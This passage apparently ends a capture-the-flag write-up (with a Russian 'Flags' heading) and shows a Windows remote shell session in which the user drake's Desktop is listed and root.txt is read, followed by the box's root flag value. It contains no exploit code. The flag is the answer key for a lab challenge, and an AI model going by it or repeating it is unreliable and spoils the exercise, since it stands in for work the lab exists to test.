08/29/2019  10:21 PM    <DIR>          drake
11/21/2010  12:16 AM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)  19,695,824,896 bytes free

c:\Users>cd drake\Desktop

c:\Users\drake\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C87F-5040

 Directory of c:\Users\drake\Desktop

08/29/2019  10:55 PM    <DIR>          .
08/29/2019  10:55 PM    <DIR>          ..
08/29/2019  10:55 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  19,695,800,320 bytes free

c:\Users\drake\Desktop>more root.txt
more root.txt
5b1001de5a44eca47eee71e7942a8f8aex
```

## 🏁 Флаги
 
- Root flag: 5b1001de5a44eca47eee71e7942a8f8aex 

---
